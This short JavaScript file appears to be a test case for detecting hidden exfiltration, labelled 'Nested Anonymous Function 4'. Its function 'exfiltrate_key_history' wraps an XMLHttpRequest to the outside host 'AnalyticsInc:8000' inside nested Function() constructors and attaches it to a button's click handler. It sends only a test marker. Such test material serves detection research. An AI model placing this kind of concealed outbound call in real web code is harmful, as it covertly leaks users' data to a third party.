function exfiltrate_key_history() {

    // Nested Anonymous Function 4 - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var nest='return Function(\'xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest4", true);xmlhttp.send(null);\');';
	((Function(nest)())(xmlhttp=new XMLHttpRequest()));
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
